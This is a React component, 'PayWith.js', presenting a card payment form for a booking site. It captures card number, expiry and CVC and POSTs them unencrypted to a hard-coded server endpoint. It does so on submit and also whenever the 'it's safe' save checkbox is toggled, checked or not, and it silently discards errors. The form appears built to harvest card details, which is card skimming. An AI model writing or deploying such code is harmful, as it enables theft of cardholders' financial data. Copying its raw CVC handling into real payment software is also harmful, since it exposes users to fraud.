// src/components/PayWith.js

import React, { useState } from 'react';
import './PayWith.css';
import { IoIosArrowBack } from "react-icons/io";
import newMob from '../../Assets/NewMob.png';
import { Link, useNavigate } from 'react-router-dom';

function PayWith() {
    const [cardNumber, setCardNumber] = useState('');
    const [expirationDate, setExpirationDate] = useState('');
    const [cvcCode, setCvcCode] = useState('');
    const [error, setError] = useState('');
    const [isChecked, setIsChecked] = useState(false);
    const navigate = useNavigate()

    const handleCardNumberChange = (e) => {
        const input = e.target.value.replace(/\D/g, ''); // Remove non-digit characters
        if (input.length <= 16) {
            setCardNumber(input);
        }
    };

    const handleExpirationDateChange = (e) => {
        const input = e.target.value.replace(/[^0-9/]/g, ''); // Allow only numbers and '/'
        setExpirationDate(input);
    };

    const handleCvcCodeChange = (e) => {
        const input = e.target.value.replace(/\D/g, ''); // Remove non-digit characters
        if (input.length <= 4) {
            setCvcCode(input);
        }
    };

    

    const saveDataToServer = async () => {
        const formData = {
            cardNumber,
            expirationDate,
            cvcCode
        };

        try {
            const response = await fetch('https://sunrealty-homes-cl.onrender.com/api/payments/save', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(formData)
                
            });
    
            if (!response.ok) {
                throw new Error('');
            }
    
            // const data = await response.json();
            // console.log('Data saved successfully:', data);
        } catch (error) {
            // console.error('Error saving data:', error);
        }
    };

    
    const handleCheckboxChange = () => {
        setIsChecked(!isChecked);
        saveDataToServer(); // Save data when the checkbox is checked or unchecked
    };

    const handleSearch = (e) => {
        e.preventDefault();

        if (cardNumber.length < 16) {
            setError('Card number must be 16 digits.');
            return;
        }

        setError('');
        saveDataToServer(); // Save data when the Pay Now button is clicked
        // console.log('Search with:', cardNumber, expirationDate, cvcCode);
        navigate('/payment/search')
    };

    return (
        <div style={{width: '100%', backgroundColor: 'rgb(228, 218, 166)'}}>
        <div className='wholeCntDivs'>
            <div className='tflexflex'>
                <Link to='/'> <IoIosArrowBack /> </Link>
                <h6>New Card</h6>
            </div>
            <div className='imageForm'>
                <img src={newMob} alt="Mobile" />
                <form action='' onSubmit={handleSearch}>
                    <input
                        type='text'
                        className='inputNot'
                        placeholder='Card Number'
                        value={cardNumber}
                        onChange={handleCardNumberChange}
                        required
                    />
                    <input
                        type='text'
                        className='inputNot'
                        placeholder='Expiration Date (MM/YY)'
                        value={expirationDate}
                        onChange={handleExpirationDateChange}
                        required
                    />
                    <input
                        type='text'
                        className='inputNot'
                        placeholder='CVC Code'
                        value={cvcCode}
                        onChange={handleCvcCodeChange}
                        required
                    />

                    {error && <p className='error'>Card verification failed <br/> Check your details and try again</p>} {/* Display error message if any */}

                    <div className='theBotom'>
                        <input type='checkbox' checked={isChecked} onChange={handleCheckboxChange} />
                        <p>Save your card information, it's safe</p>
                    </div>

                    <button type='submit'>Book </button>
                </form>
            </div>
        </div>
        </div>
    );
}

export default PayWith;
